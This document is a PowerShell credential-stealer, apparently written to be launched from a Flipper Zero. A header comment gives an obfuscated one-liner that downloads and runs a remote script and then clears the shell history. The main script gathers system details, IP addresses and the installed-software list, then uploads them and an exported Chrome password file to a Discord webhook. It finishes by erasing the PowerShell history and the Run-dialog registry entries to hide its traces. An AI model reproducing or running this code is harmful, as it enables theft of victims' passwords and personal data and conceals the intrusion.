#Payload to execute in your flipperZero: this dowload, execute and clear history
#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit

#Todo:
# Correct the Edge password error

#CHANGE URL TO YOUR URL
  $url="https://discordapp.com/api/webhooks/1073986113166905364/y0pF_Wsr4RR__Fi0IcFO3FK8-tbR7ElRM6rN7YqC56O4d2b_5DfY6EzrW9wSPzRYZ7IG" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

  
# Get PC information
  dir env: >> "$env:temp\stats-$namepc.txt";
# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";


#Define zip to copy
$chromepassword = "$env:temp\export.htm"

#UPLOAD
cd $env:temp
# Send Name Computer to discord
  $Body=@{ content = "**Nazwa użytkownika:** $env:UserName, Nazwa komputera: $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;

# Upload Webbroser Password Pwned
  $Body=@{ content = "**Hasla z komputera**"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload chrome password
  curl.exe -i -F file=@"$chromepassword" $url

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
exit;
